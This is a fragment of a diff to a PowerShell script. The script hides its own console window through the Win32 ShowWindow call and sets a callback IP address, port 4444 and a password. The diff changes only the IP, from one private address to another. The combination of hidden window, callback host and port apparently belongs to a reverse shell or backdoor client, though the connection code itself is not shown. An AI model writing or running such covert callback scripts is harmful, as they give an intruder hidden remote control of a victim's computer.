@@ -6,7 +6,7 @@ $api = Add-Type -Name Win32 -MemberDefinition @'
 
 $api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
-$ip = '192.168.1.15'
+$ip = '172.20.10.3'
 $port = 4444
 $pass = "biskviti"
 
